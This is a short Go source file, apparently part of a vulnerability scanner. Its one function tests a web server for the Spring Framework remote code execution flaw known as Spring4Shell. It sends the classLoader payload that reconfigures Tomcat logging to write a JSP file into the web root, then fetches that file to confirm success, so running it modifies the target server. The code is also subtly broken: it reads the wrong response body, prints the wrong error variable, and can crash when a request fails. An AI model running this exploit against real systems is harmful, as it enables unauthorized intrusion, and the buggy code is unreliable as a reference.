package lib

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
)

func SpringFramework(url string, wg *sync.WaitGroup) {
	defer wg.Done()

	resp, err := http.Get(string(url) + "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=file_input_test&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=77585217758521")
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()

	resp1, err1 := http.Get(string(url) + "/tomcatwar77585217758521.jsp")
	if err1 != nil {
		fmt.Println(err)
	}
	defer resp1.Body.Close()
	body1, err := ioutil.ReadAll(resp.Body)
	res1 := strings.Contains(string(body1), "file_input_test")
	if res1 || resp1.StatusCode == 200 {
		fmt.Println(Green("[+] SpringFrameworkRCE 存在！"))
	} else {
		fmt.Println(Red("[-] SpringFrameworkRCE 不存在"))
	}

}
